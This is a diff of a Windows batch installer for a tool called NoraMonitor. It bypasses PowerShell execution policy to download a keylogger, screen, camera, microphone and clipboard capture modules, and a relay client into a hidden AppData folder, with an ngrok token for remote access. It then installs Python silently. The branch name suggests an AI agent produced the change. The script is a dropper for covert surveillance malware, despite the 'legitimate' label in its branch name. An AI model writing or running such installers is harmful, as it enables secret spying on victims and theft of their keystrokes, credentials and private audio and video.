@@ -2,18 +2,17 @@
 setlocal enabledelayedexpansion
 
 set "DIR=%APPDATA%\NoraMonitor"
-set "REPO=smallkhk/Nora-signal"
-set "BRANCH=claude/legitimate-keylogger-lm3rqu"
+set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/claude/legitimate-keylogger-lm3rqu/nora-monitor"
 set "TOKENFILE=%DIR%\ngrok.token"
 
 mkdir "%DIR%\templates" 2>nul
 mkdir "%DIR%\recordings" 2>nul
 
-:: Download all files from GitHub using API (handles branch names with slashes)
+:: Download all files from GitHub (skip missing files silently)
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "$api='https://api.github.com/repos/%REPO%/contents/nora-monitor'; $ref='%BRANCH%'; $d='%DIR%'; $h=@{Accept='application/vnd.github.v3.raw'};" ^
-  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt' | %%{ try { Invoke-WebRequest \"$api/$_`?ref=$ref\" -Headers $h -OutFile \"$d\$_\" -ErrorAction Stop } catch { Write-Host \"Skip: $_\" } };" ^
-  "try { Invoke-WebRequest \"$api/templates/viewer.html`?ref=$ref\" -Headers $h -OutFile \"$d\templates\viewer.html\" -ErrorAction Stop } catch {}"
+  "$r='%RAW%'; $d='%DIR%';" ^
+  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','clipboard_monitor.py','processes.py','relay_client.py','file_manager.py','microphone.py','requirements.txt' | %%{ try { Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" -ErrorAction Stop } catch { Write-Host \"Skip: $_\" } };" ^
+  "try { Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\" -ErrorAction Stop } catch {}"
 
 :: Install Python silently if not present
 python --version >nul 2>&1
